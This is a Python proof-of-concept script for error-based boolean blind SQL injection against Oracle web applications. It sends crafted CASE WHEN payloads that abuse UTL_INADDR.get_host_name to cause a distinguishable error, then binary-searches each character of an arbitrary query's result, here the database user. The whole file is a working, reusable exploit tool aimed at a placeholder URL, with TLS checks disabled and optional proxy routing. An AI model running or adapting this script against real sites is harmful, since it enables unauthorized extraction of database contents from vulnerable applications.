################################################################################################
#  Description:  
#  A rough HTTP GET based POC for dumping results from an Oracle database using boolean logic based
#  on the error message produced.
#
#  Author: b0yd
#
################################################################################################

import requests
import urllib
import time
import math
import sys

proxies = None
#Comment out if not using a proxy like Burp, etc
#proxies = {
#  'http': 'http://127.0.0.1:8080',
#  'https': 'http://127.0.0.1:8080',
#}

# if len(sys.argv) < 2:
  # print "Usage: python oracle_boolean_time.py <SQL Query>"
  # sys.exit(1)
  
# query = sys.argv[1]

#Example User Agent string
headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0'}
           
#Set to bypass errors if the target site has SSL issues
requests.packages.urllib3.disable_warnings()

#Set this to the parameter name for the POST request
vuln_param_name = "param1"

#The success string
success_str = "network access denied"

#Target URL
url = "https://example.com/vulnerable_page.html"

#Set this to the beginning ascii ordinal value
begin_num = 32
#Set this to the end ascii ordinal value
end_num = 127

def str2chr(in_str):
  out_str = ''
  for i in in_str:
    out_str += "CHR(%d)||" % ord(i) 
  return out_str.strip('||')

#Used to find the length of the returned SQL string
def get_str_length(query, start_ord, end_ord):

  s = start_ord
  e = end_ord 
  res_len = 0
  mid = 0
  
  #Update mid point
  while True:
    diff = e - s
    if s == end_ord:
      print "[-] Length not found. Exiting"
      res_len = 0
      break
    elif diff == 0:
      res_len = s
      break
          
    #Set mid point 
    mid = int(math.floor(diff/2)) + s    
    print "[+] Current ret query length: %d" % mid
  
    data = "(CASE WHEN ( length((%s)) > %d ) THEN (ascii(substr((SELECT UTL_INADDR.get_host_name(1) FROM dual),1,1))) ELSE 1 END)" % (query, mid)
    ret = make_request(url, data)	  
    
    #Query succeeded
    if success_str in ret:
      #Move the range past the mid point
      s = mid + 1        
    else:   
      #Move the range past to mid point
      e = mid

  return res_len


def make_request( addr, data ):      
        
  # data
  enc_data = urllib.urlencode({vuln_param_name: data})  
  
  #Setup request
  count = 3
  while count > 0:
    try:
      r = requests.get(addr, proxies=proxies, params=enc_data, verify=False, headers=headers)
      break
    except:
      count -= 1
      time.sleep(5)
      continue
        
  return r.text

def get_string(str_len, query, start_ord, end_ord):

  full_str = ''
  counter = 1
  while( len(full_str) < str_len ):

    s = start_ord
    e = end_ord 
    letter_found = False
    mid = 0
    
    while True:
    
      #Update mid point
      diff = e - s
      if s == end_ord:
        print "[-] Letter not found. Exiting"
        break
      elif diff == 0:
        full_str += chr(s)
        counter += 1
        letter_found = True
        break  
      
      #Set mid point 
      mid = int(math.floor(diff/2)) + s    
      #print "[+] Current ASCII char: %d" % mid
      if mid == start_ord:
        print "[-] Letter not found. Exiting"
        break
      
      #Construct query
      data = "(CASE WHEN ( (ascii(substr((%s),%s,1))) > %d ) THEN (ascii(substr((SELECT UTL_INADDR.get_host_name(1) FROM dual),1,1))) ELSE 1 END)" % (query, counter, mid)
      ret = make_request(url, data)	  
      
      #Query succeeded
      if success_str in ret:
        #Move the range past the mid point
        s = mid + 1     
        #print("[+] True case")        
      else:   
        #Move the range past to mid point
        e = mid
        #print("[+] False case") 
		
    print full_str
    #sys.exit(1)


    if letter_found == False:
      print "[-] Letter not found. Exiting"
      break

  return full_str
    

#SQL query to execute
query = "select user from dual"

#Print the query
print "[+] Running query: '%s'" % query

stime = time.time()

#Get result string length
str_len = get_str_length(query, 0, 100)

print "[+] Length: %d" % str_len
if str_len > 0:
    user = get_string(str_len, query, begin_num, end_num)
    etime = time.time()
    print "[+] Result: %s" % user
    print "[+] Total Time: %d seconds" % (etime-stime)
    
 